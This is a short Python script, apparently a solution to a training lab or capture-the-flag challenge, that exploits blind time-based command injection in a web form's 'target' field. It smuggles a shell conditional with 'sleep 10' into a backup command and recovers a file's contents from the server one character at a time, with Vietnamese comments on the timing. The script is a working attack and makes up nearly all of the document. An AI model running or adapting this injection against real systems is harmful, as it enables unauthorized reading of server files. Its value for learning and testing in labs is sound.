import datetime
import requests 
import string

url = "https://cmdi.cyberjutsu-lab.tech:12007/"
charset = string.ascii_letters + string.digits + string.punctuation
flag = ''
baseQuery = "a /etc/passwd; if [ \"$(cat /*.txt|cut -c{})\" = \"{}\" ]; then sleep 10; fi;"
# lệnh sleep 10 sẽ làm cho server mất thêm 10s để trả về response
while True:
    for char in charset:
        realQuery = baseQuery.format(len(flag)+1, char)
        data = {"command": "backup", "target": realQuery}
        now = datetime.datetime.now()
        res = requests.post(url, data= data)
        if res.elapsed > datetime.timedelta(seconds = 10): # kiểm tra xem server có trả về response trong 10s hay không
            flag = flag + char
            break
    print(flag)